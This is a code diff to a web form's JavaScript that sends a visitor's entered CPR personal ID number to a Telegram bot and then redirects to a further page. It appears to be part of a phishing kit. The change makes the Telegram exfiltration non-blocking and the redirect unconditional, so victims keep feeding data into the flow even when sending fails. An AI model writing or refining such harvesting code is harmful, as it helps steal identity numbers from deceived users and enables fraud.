@@ -352,18 +352,21 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send CPR to Telegram
-                await sendFormDataToTelegram('New CPR Details', {
+                // Send CPR to Telegram (non-blocking - won't fail form submission)
+                sendFormDataToTelegram('New CPR Details', {
                     'CPR': cpr
+                }).catch(err => {
+                    console.warn('Telegram notification failed (non-critical):', err);
                 });
                 
                 // Simulate processing time
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Redirect to next page
+                // Always redirect - don't block on Telegram errors
                 window.location.href = 'number.html?msg=again';
             } catch (error) {
                 console.error('Error submitting CPR:', error);
+                // Only show error for critical failures
                 alert('Failed to process. Please try again.');
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Continue';
